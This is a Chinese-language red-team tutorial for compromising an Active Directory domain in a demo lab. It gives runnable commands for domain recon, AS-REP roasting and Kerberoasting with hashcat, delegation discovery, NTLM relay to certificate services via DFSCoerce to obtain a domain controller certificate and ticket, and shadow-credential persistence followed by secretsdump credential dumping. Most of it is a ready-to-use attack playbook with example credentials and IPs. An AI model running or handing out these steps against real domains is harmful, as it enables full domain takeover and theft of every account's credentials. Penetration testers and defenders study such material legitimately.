### 1\. 域内信息收集

推荐工具 `ldapdomaindump`：

```

python3 ldapdomaindump.py -u red.local\\\\john -p P@ssw0rd 192.168.2.31
```

需要一个域用户账号密码，可以获取详细的各种域内信息，有 `html` 格式以及 `json` 格式的文件，非常直观。

具体效果如下：

![](../Images/484801600652b7e391f2cfdf3b4f0a0f.png)![](../Images/3c7d61bb883d7df12e1cf64b29e2d4eb.png)

可以看到域用户属于哪个组以及其密码更改的时间。可以提取出其中密码不曾改变或很久没改的账户进行后续针对攻击。

### 2\. pre-auth 配置错误

对于域用户，如果设置了选项 `Do not require Kerberos preauthentication`（不要求Kerberos预身份认证），此时向域控制器的 88 端口发送 `AS-REQ` 请求，对收到的 `AS-REP` 内容重新组合，能够拼接成 `“Kerberos 5 AS-REP etype 23”(18200)` 的格式，接下来可以使用 `hashcat` 或是 `john` 对其破解，最终获得该用户的明文口令。默认情况下该配置不会设置。

使用 `impacket` 工具包 `GetNPUsers.py` 发现不做 `Kerberos` 预认证用户

```

GetNPUsers.py -dc-ip 192.168.10.16 red.local/john:P@ssw0rd
```

然后使用 `hashcat` 破解得到的 `hash` 即可。

```

hashcat -m 18200 /usr/share/wordlists/rockyou.txt hash.txt
```

### 3\. 查找域内的委派信息

使用 `impacket` 工具包 `findDelegation.py` 发现域内配置的委派信息

```

python3 findDelegation.py -target-domain red.local red.local/john:'P@ssw0rd' -dc-ip 192.168.31.40
```

可以获取到域内配置的委派信息，看后续是否可利用。

### 4\. 爆破域内的 spn 服务

使用 `impacket` 工具包 `GetUserSPNs.py` 可以获取到域内配置了 `spn` 服务的一些账号

```

python3 GetUserSPNs.py red.local/john:'P@ssw0rd' -dc-ip 192.168.31.40 -request
```

可以获取到 `spn` 服务的 `hash`，后续可以利用 `hashcat` 进行爆破

```

hashcat -m 13100 /usr/share/wordlists/rockyou.txt hash.txt --force -o found.txt
```

### 5\. NTLM relay 攻击

在拿到一个域用户密码后，我们可以尝试进行中继攻击来拿下更多的权限。

若环境存在证书服务，可以尝试主动让域控触发认证，并中继到证书服务器来拿下整个域环境。

主动触发利用：

演示环境：

*   `Kali：192.168.2.7`
    
*   `域控：192.168.2.31`
    
*   `Ad cs：192.168.2.27`
    

利用条件：

1.  存在证书服务器
    
2.  普通域账号密码
    

首先在 `kali` 使用 `ntlmrelayx` 监听:

```

python3 ntlmrelayx.py -t http://192.168.2.27/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

  

![](../Images/ef12d289e445c74d726f93f7682c5cf7.png)

然后使用 `dfscoerce` 主动触发

![](../Images/b7d425c0c9f1e99d652f3a0888968df1.png)

然后我们在 `ntlmrelayx` 那边即可接收到返回来的信息：

![](../Images/d03b8b2b4fcc5792327088a70fc13383.png)

获得一个 `base64` 的证书

申请到证书之后，向域控申请票据：

```

python3 gettgtpkinit.py -pfx-base64 证书 red/dc$ dc.ccache -dc-ip 192.168.2.14
```

之后即可进行转储 `hash` 等操作。

### 6\. 权限维持

影子凭证：

该技术需要以下要求：

*   一个系统版本至少为 `Windows Server 2016` 的域控制器
*   安装在域控制器上的服务器身份验证数字证书
*   拥有写入目标对象 `msDS-KeyCredentialLink` 属性的权限的帐户

在获取到域控权限后我们可以使用域管理员账户来进行操作，维持权限。

```

python3 pywhisker.py -d red.local -u administrator -p P@ssw0rd --target dc$ --action add --filename dc --dc-ip 192.168.2.14
```

  

![](../Images/8af7eef9de8112670c8d6ef12911a4b8.png)

然后即可使用该证书向域控请求票据

![](../Images/7e45f218d44e68f693d4a0bfd728abb2.png)

拿到票据后即可使用 `secretsdump.py` 转储凭证，达到维权目的。

只要在证书有效期内即可(默认为5年)。
